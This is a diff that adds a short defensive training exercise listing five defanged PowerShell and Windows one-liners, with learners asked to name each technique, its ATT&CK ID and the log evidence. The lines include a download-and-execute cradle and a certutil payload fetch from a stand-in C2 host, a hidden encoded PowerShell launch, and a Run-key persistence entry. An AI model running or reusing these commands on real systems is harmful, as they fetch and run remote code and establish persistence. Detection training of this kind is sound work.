@@ -1,0 +1,8 @@
+# Five malicious one-liners (static, defanged, fictional). For each, identify:
+# technique, ATT&CK ID, and the log evidence it generates.
+
+1  iex ((New-Object Net.WebClient).DownloadString('hxxps://fake-c2[.]test/s'))
+2  powershell.exe -nop -w hidden -enc <base64-UTF16LE-blob>
+3  certutil.exe -urlcache -split -f hxxps://fake-c2[.]test/p p
+4  Set-ItemProperty 'HKCU:\...\CurrentVersion\Run' -Name x -Value 'powershell -enc ...'
+5  ConvertTo-SecureString 'PlainPw!' -AsPlainText -Force
